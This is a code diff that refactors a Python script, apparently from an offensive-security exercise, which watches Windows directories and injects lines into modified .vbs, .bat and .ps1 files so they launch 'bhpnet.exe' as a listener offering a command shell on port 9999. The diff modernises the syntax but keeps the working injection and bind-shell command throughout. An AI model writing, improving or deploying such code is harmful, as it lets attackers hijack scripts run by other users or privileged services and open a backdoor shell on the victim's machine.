@@ -16,14 +16,15 @@ FILE_MODIFIED = 3
 FILE_RENAMED_FROM = 4
 FILE_RENAMED_TO = 5
 
-# extension based code snippets to inject
-file_types = {}
 command = "C:\\WINDOWS\\TEMP\\bhpnet.exe –l –p 9999 –c"
-file_types['.vbs'] = ["\r\n'bhpmarker\r\n",
-                      "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n"
-                      % command]
-file_types['.bat'] = ["\r\nREM bhpmarker\r\n", "\r\n%s\r\n" % command]
-file_types['.ps1'] = ["\r\n#bhpmarker", "Start-Process \"%s\"" % command]
+file_types = {
+    '.vbs': [
+        "\r\n'bhpmarker\r\n",
+        "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command,
+    ],
+    '.bat': ["\r\nREM bhpmarker\r\n", "\r\n%s\r\n" % command],
+    '.ps1': ["\r\n#bhpmarker", "Start-Process \"%s\"" % command],
+}
 
 
 def inject_code(full_filename, extension, contents):
@@ -36,10 +37,8 @@ def inject_code(full_filename, extension, contents):
     full_contents += file_types[extension][1]
     full_contents += contents
 
-    fd = open(full_filename, "wb")
-    fd.write(full_contents.encode())
-    fd.close()
-
+    with open(full_filename, "wb") as fd:
+        fd.write(full_contents.encode())
     print("[\o/] Injected code.")
 
     return
@@ -80,19 +79,18 @@ def start_monitor(path_to_watch):
                 full_filename = os.path.join(path_to_watch, file_name)
 
                 if action == FILE_CREATED:
-                    print("[ + ] Created %s" % full_filename)
+                    print(f"[ + ] Created {full_filename}")
                 elif action == FILE_DELETED:
-                    print("[ - ] Deleted %s" % full_filename)
+                    print(f"[ - ] Deleted {full_filename}")
                 elif action == FILE_MODIFIED:
-                    print("[ * ] Modified %s" % full_filename)
+                    print(f"[ * ] Modified {full_filename}")
 
                     # dump out the file contents
                     print("[vvv] Dumping contents...")
 
                     try:
-                        fd = open(full_filename, "rb")
-                        contents = fd.read()
-                        fd.close()
+                        with open(full_filename, "rb") as fd:
+                            contents = fd.read()
                         print(contents)
                         print("[^^^] Dump complete.")
                         filename, extension = os.path.splitext(full_filename)
@@ -102,16 +100,16 @@ def start_monitor(path_to_watch):
                         print("[!!!] Failed.")
 
                 elif action == FILE_RENAMED_FROM:
-                    print("[ > ] Renamed from: %s" % full_filename)
+                    print(f"[ > ] Renamed from: {full_filename}")
                 elif action == FILE_RENAMED_TO:
-                    print("[ < ] Renamed to: %s" % full_filename)
+                    print(f"[ < ] Renamed to: {full_filename}")
                 else:
-                    print("[???] Unknown: %s" % full_filename)
+                    print(f"[???] Unknown: {full_filename}")
         except:
             pass
 
 
 for path in dirs_to_monitor:
     monitor_thread = threading.Thread(target=start_monitor, args=(path,))
-    print("Spawning monitoring thread for path: %s" % path)
+    print(f"Spawning monitoring thread for path: {path}")
     monitor_thread.start()
